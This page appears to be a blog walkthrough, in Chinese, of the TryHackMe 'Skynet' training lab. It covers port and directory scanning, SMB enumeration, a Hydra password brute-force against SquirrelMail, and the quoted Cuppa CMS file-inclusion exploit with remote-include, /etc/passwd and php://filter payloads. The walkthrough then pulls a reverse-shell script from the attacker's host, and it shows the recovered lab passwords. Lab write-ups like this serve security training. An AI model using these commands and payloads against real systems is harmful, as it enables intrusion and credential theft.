

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
  <link rel="icon" href="/img/favicon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="cvbxy">
  <meta name="keywords" content="">
  
    <meta name="description" content="TryHackMe靶机记录">
<meta property="og:type" content="article">
<meta property="og:title" content="TryHackMe-Skynet">
<meta property="og:url" content="https://cvbxy.github.io/2023/07/22/TryHackMe-Skynet/index.html">
<meta property="og:site_name" content="cvbxy&#39;s blog">
<meta property="og:description" content="TryHackMe靶机记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cvbxy.github.io/img/blog2.jpeg">
<meta property="article:published_time" content="2023-07-22T13:36:27.000Z">
<meta property="article:modified_time" content="2023-07-22T13:38:57.529Z">
<meta property="article:author" content="cvbxy">
<meta property="article:tag" content="TryHackMe">
<meta property="article:tag" content="靶机">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cvbxy.github.io/img/blog2.jpeg">
  
  
  
  <title>TryHackMe-Skynet - cvbxy&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"cvbxy.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="cvbxy's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>cvbxy&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="TryHackMe-Skynet"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-07-22 21:36" pubdate>
          2023年7月22日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          11k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          92 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">TryHackMe-Skynet</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Skynet"><a href="#Skynet" class="headerlink" title="Skynet"></a>Skynet</h1><blockquote>
<p>What is Miles password for his emails?</p>
</blockquote>
<p>nmap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>110/tcp open  pop3<br>139/tcp open  netbios-ssn<br>143/tcp open  imap<br>445/tcp open  microsoft-ds<br><br>PORT    STATE SERVICE     VERSION<br>80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-title: Skynet<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>110/tcp open  pop3        Dovecot pop3d<br>|_pop3-capabilities: TOP CAPA UIDL RESP-CODES SASL AUTH-RESP-CODE PIPELINING<br>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>143/tcp open  imap        Dovecot imapd<br>|_imap-capabilities: post-login LITERAL+ LOGIN-REFERRALS more IMAP4rev1 capabilities have listed Pre-login IDLE LOGINDISABLEDA0001 SASL-IR ENABLE OK ID<br>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br><br>Host script results:<br>|_clock-skew: mean: 1h40m06s, deviation: 2h53m24s, median: 0s<br>|_nbstat: NetBIOS name: SKYNET, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-07-22T12:26:22<br>|_  start_date: N/A<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: skynet<br>|   NetBIOS computer name: SKYNET\x00<br>|   Domain name: \x00<br>|   FQDN: skynet<br>|_  System time: 2023-07-22T07:26:22-05:00<br></code></pre></td></tr></table></figure>

<p>目录扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># gobuster dir -u http://10.10.5.188/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br>/admin                (Status: 301) [Size: 310] [--&gt; http://10.10.5.188/admin/]<br>/config               (Status: 301) [Size: 311] [--&gt; http://10.10.5.188/config/]<br>/css                  (Status: 301) [Size: 308] [--&gt; http://10.10.5.188/css/]<br>/index.html           (Status: 200) [Size: 523]<br>/js                   (Status: 301) [Size: 307] [--&gt; http://10.10.5.188/js/]<br>/server-status        (Status: 403) [Size: 276]<br>/squirrelmail         (Status: 301) [Size: 317] [--&gt; http://10.10.5.188/squirrelmail/]<br></code></pre></td></tr></table></figure>

<p>爆破smb服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─<span class="hljs-comment"># enum4linux -a 10.10.5.188</span><br><br>[+] Attempting to map shares on 10.10.5.188<br>//10.10.5.188/print$    Mapping: DENIED Listing: N/A Writing: N/A<br>//10.10.5.188/anonymous Mapping: OK Listing: OK Writing: N/A<br>//10.10.5.188/milesdyson        Mapping: DENIED Listing: N/A Writing: N/A<br>[E] Can<span class="hljs-string">&#x27;t understand response:</span><br><span class="hljs-string">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="hljs-string">//10.10.5.188/IPC$      Mapping: N/A Listing: N/A Writing: N/A</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 有个匿名登录</span><br><span class="hljs-string">┌──(root㉿kali)-[/home/kali]</span><br><span class="hljs-string">└─# smbclient //10.10.5.188/anonymous</span><br><span class="hljs-string">Password for [WORKGROUP\kali]:</span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Fri Nov 27 00:04:00 2020</span><br><span class="hljs-string">  ..                                  D        0  Tue Sep 17 15:20:17 2019</span><br><span class="hljs-string">  attention.txt                       N      163  Wed Sep 18 11:04:59 2019</span><br><span class="hljs-string">  logs                                D        0  Wed Sep 18 12:42:16 2019</span><br><span class="hljs-string"></span><br><span class="hljs-string">                9204224 blocks of size 1024. 5831064 blocks available</span><br><span class="hljs-string">smb: \&gt; get attention.txt</span><br><span class="hljs-string">getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br><span class="hljs-string">smb: \&gt; cd logs</span><br><span class="hljs-string">smb: \logs\&gt; ls</span><br><span class="hljs-string">  .                                   D        0  Wed Sep 18 12:42:16 2019</span><br><span class="hljs-string">  ..                                  D        0  Fri Nov 27 00:04:00 2020</span><br><span class="hljs-string">  log2.txt                            N        0  Wed Sep 18 12:42:13 2019</span><br><span class="hljs-string">  log1.txt                            N      471  Wed Sep 18 12:41:59 2019</span><br><span class="hljs-string">  log3.txt                            N        0  Wed Sep 18 12:42:16 2019</span><br></code></pre></td></tr></table></figure>

<p>attention.txt：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">A recent <span class="hljs-keyword">system</span> malfunction has caused various passwords <span class="hljs-keyword">to</span> be changed. <span class="hljs-keyword">All</span> skynet employees are required <span class="hljs-keyword">to</span> change their <span class="hljs-keyword">password</span> <span class="hljs-keyword">after</span> seeing this.<br>-Miles Dyson<br></code></pre></td></tr></table></figure>

<p>log1.txt：</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cyborg007haloterminator<br>terminator22596<br>terminator219<br>terminator20<br>terminator1989<br>terminator1988<br>terminator168<br>terminator16<br>terminator143<br>terminator13<br>terminator123!@#<br>terminator1056<br>terminator101<br>terminator10<br>terminator02<br>terminator00<br>roboterminator<br>pongterminator<br>manasturcaluterminator<br><span class="hljs-keyword">exterminator95</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">exterminator200</span><br><span class="hljs-keyword"></span>dterminator<br>djxterminator<br>dexterminator<br>determinator<br>cyborg007haloterminator<br>avsterminator<br>alonsoterminator<br>Walterminator<br><span class="hljs-number">79</span>terminator6<br><span class="hljs-number">1996</span>terminator<br></code></pre></td></tr></table></figure>

<p>之前目录扫描有个邮件登录，smb爆破发现一个用户名milesdyson，使用hydra爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># hydra -l milesdyson -P /home/kali/log1.txt 10.10.5.188 http-form-post &quot;/squirrelmail/src/redirect.php:login_username=milesdyson&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=Unknown User or password incorrect.&quot;</span><br>[80][http-post-form] host: 10.10.5.188   login: milesdyson   password: cyborg007haloterminator<br></code></pre></td></tr></table></figure>

<p><img src="/img/blogimg/Untitled.png" srcset="/img/loading.gif" lazyload></p>
<p>第一封邮件：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">We have changed your smb <span class="hljs-keyword">password</span> <span class="hljs-keyword">after</span> <span class="hljs-keyword">system</span> malfunction.<br><span class="hljs-keyword">Password</span>: )s&#123;A&amp;<span class="hljs-number">2</span>Z=F^n_E.B`<br></code></pre></td></tr></table></figure>

<p>登录smb：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># smbclient -U milesdyson //10.10.5.188/milesdyson</span><br>Improving Deep Neural Networks.pdf                            N  5743095  Tue Sep 17 17:05:14 2019<br>Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 17:05:14 2019<br>Convolutional Neural Networks-CNN.pdf                         N 19655446  Tue Sep 17 17:05:14 2019<br>notes                                                         D        0  Tue Sep 17 17:18:40 2019<br>Neural Networks and Deep Learning.pdf                         N  4304586  Tue Sep 17 17:05:14 2019<br>Structuring your Machine Learning Project.pdf                 N  3531427  Tue Sep 17 17:05:14 2019<br><br>smb: \&gt; <span class="hljs-built_in">cd</span> notes<br>smb: \notes\&gt; <span class="hljs-built_in">ls</span><br>important.txt                       N      117  Tue Sep 17 17:18:39 2019<br></code></pre></td></tr></table></figure>

<blockquote>
<p>What is the hidden directory?</p>
</blockquote>
<p>important.txt，发现了一个目录<code>/45kra24zxs28v3yd</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. Add features to beta CMS /45kra24zxs28v3yd<br>2. Work on T-800 Model 101 blueprints<br>3. Spend more time with my wife<br></code></pre></td></tr></table></figure>

<p>![](&#x2F;img&#x2F;blogimg&#x2F;Untitled 1.png)</p>
<p>对二级目录进行目录扫描：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://10.10.5.188/45kra24zxs28v3yd -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt<br>/administrator        (Status: 301) [Size: 335] [--&gt; http://10.10.5.188/45kra24zxs28v3yd/administrator/]<br></code></pre></td></tr></table></figure>

<p>![](&#x2F;img&#x2F;blogimg&#x2F;Untitled 2.png)</p>
<blockquote>
<p>What is the vulnerability called when you can include a remote file for malicious purposes?</p>
</blockquote>
<p>![](&#x2F;img&#x2F;blogimg&#x2F;Untitled 3.png)</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Exploit Title   : Cuppa CMS File Inclusion</span><br><span class="hljs-comment"># Date            : 4 June 2013</span><br><span class="hljs-comment"># Exploit Author  : CWH Underground</span><br><span class="hljs-comment"># Site            : www.2600.in.th</span><br><span class="hljs-comment"># Vendor Homepage : http://www.cuppacms.com/</span><br><span class="hljs-comment"># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip</span><br><span class="hljs-comment"># Version         : Beta</span><br><span class="hljs-comment"># Tested on       : Window and Linux</span><br><br>  ,--^----------,--------,-----,-------^--,<br>  | |||||||||   `--------<span class="hljs-string">&#x27;     |          O .. CWH Underground Hacking Team ..</span><br><span class="hljs-string">  `+---------------------------^----------|</span><br><span class="hljs-string">    `\_,-------, _________________________|</span><br><span class="hljs-string">      / XXXXXX /`|     /</span><br><span class="hljs-string">     / XXXXXX /  `\   /</span><br><span class="hljs-string">    / XXXXXX /\______(</span><br><span class="hljs-string">   / XXXXXX /          </span><br><span class="hljs-string">  / XXXXXX /</span><br><span class="hljs-string"> (________(            </span><br><span class="hljs-string">  `------&#x27;</span><br><br><span class="hljs-comment">####################################</span><br>VULNERABILITY: PHP CODE INJECTION<br><span class="hljs-comment">####################################</span><br><br>/alerts/alertConfigField.<span class="hljs-title function_ invoke__">php</span> (<span class="hljs-attr">LINE</span>: <span class="hljs-number">22</span>)<br><br>-----------------------------------------------------------------------------<br>LINE <span class="hljs-number">22</span>: <br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;urlConfig&quot;</span>]); <span class="hljs-meta">?&gt;</span><br>-----------------------------------------------------------------------------<br>    <br><br><span class="hljs-comment">#####################################################</span><br>DESCRIPTION<br><span class="hljs-comment">#####################################################</span><br><br>An attacker might <span class="hljs-keyword">include</span> local <span class="hljs-keyword">or</span> remote PHP files <span class="hljs-keyword">or</span> read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.<br><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]</span><br><br><span class="hljs-comment">#####################################################</span><br>EXPLOIT<br><span class="hljs-comment">#####################################################</span><br><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br><br>Moreover, We could access Configuration.php source code via PHPStream <br><br>For Example:<br>-----------------------------------------------------------------------------<br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</span><br>-----------------------------------------------------------------------------<br><br>Base64 Encode Output:<br>-----------------------------------------------------------------------------<br>PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+<br>-----------------------------------------------------------------------------<br><br>Base64 Decode Output:<br>-----------------------------------------------------------------------------<br><span class="hljs-meta">&lt;?php</span> <br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Configuration</span></span>&#123;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span> = <span class="hljs-string">&quot;cuppa&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;Db@dmin&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$table_prefix</span> = <span class="hljs-string">&quot;cu_&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$administrator_template</span> = <span class="hljs-string">&quot;default&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$list_limit</span> = <span class="hljs-number">25</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span> = <span class="hljs-string">&quot;OBqIPqlFWf3X&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$allowed_extensions</span> = <span class="hljs-string">&quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_default_path</span> = <span class="hljs-string">&quot;media/uploadsFiles&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$maximum_file_size</span> = <span class="hljs-string">&quot;5242880&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login</span> = <span class="hljs-number">0</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login_value</span> = <span class="hljs-string">&quot;&quot;</span>;<br>		<span class="hljs-keyword">public</span> <span class="hljs-variable">$secure_login_redirect</span> = <span class="hljs-string">&quot;&quot;</span>;<br>	&#125; <br><span class="hljs-meta">?&gt;</span><br>-----------------------------------------------------------------------------<br><br>Able to read sensitive information via File <span class="hljs-title function_ invoke__">Inclusion</span> (PHP Stream)<br><br><span class="hljs-comment">################################################################################################################</span><br> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD <span class="hljs-variable">$ectors</span>, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 <br><span class="hljs-comment">################################################################################################################</span><br></code></pre></td></tr></table></figure>

<p>在本机放一个反弹shell的脚本，通过远程文件包含获取shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在浏览器执行</span><br>http://10.10.5.188/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://本机IP/phpshell.php<br></code></pre></td></tr></table></figure>

<blockquote>
<p>What is the user flag?</p>
</blockquote>
